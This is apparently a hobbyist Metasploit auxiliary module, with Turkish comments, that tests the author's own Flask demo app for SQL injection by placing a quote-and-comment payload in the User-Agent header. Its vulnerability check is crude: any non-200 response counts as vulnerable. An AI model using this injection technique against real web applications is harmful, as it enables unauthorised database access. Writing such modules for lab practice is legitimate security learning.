require 'csv'

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient #optionstan gelen targeturi dısındakileri buradan alır
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'AreasaSec python flask demo',
                      'Description' => '
        is my demo testing flask vulnerable application testing...
      ',
                      'License' => MSF_LICENSE,
                      'Author' =>
                        [
                          'Areasa Sec <areasasec[at]gmail.com>'
                        ],
                      'References' => [
                        ['CVE', '2018-17179'],
                        ['URL', 'https://github.com/areasasec']
                      ],
                      'DisclosureDate' => '2021-03-17'
          ))

    register_options(
      [
        # Opt::RPORT(5000) # default 80 geliyor gelmesin ben 5000 de calisiyorum.
        #OptString.new('TARGETURI', [true, 'The base path to the areasasecdemo installation', '/areasasecdemo'])
        Opt::RPORT(5000),
        OptString.new('TARGETURI', [true, 'The base path to the areasasecdemo demo', '/'])
      ]
    )
  end


  def sqli(query)
    rand = Rex::Text.rand_text_alpha(5)
    query = "#{rand}';#{query};--"
    vprint_status(query) # console log gibi bişi.... ama set verbose true yapcan...
    res = send_request_cgi({
                             'method' => 'GET',
                             'uri' => normalize_uri(target_uri.path, '/'),
                             'headers' => {
                               'User-Agent' => "#{query}'",
                             }
                           })
    return res
  end

  def check
    res = sqli("'")
    if res && res.code == 200
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Vulnerable
    end
  end


  def run
    unless check == Exploit::CheckCode::Vulnerable
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    print_good(" HER SEY COK GUZEL !")

  end
end
